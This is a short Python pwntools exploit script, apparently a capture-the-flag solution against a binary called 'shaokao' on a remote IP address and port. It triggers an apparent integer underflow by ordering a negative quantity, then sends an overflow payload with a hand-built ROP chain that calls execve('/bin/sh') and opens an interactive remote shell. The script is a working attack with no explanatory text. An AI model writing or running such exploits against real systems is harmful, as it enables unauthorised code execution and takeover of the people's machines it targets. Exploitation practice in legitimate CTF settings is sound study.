from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./shaokao')
else:
    io = remote('39.105.187.49',24835)

def p():
    gdb.attach(proc.pidof(io)[0])

name =  0x4e60f0
pop_rsi = 0x000000000040a67e # pop rsi ; ret
pop_rdi = 0x000000000040264f # pop rdi ; ret
pop_rdx_rbx = 0x00000000004a404b # pop rdx ; pop rbx ; ret
pop_rax = 0x0000000000458827 # pop rax ; ret
syscall = 0x0000000000402404 # syscall
#one_gadget = [,,]
io.sendlineafter(b">", str(1).encode())
io.sendlineafter(b"3.", str(1).encode())
pause()
io.sendline(str(-10000).encode())
io.sendlineafter(b">", str(4).encode())
io.sendlineafter(b">", str(5).encode())
#p()
payload = b'/bin/sh\x00' + b'a' * 0x20 
ROP = flat(
    pop_rdi, name, pop_rsi, 0, pop_rdx_rbx,0, 0, pop_rax, 0x3b ,syscall
)
payload += ROP

io.sendline(payload)


io.interactive()

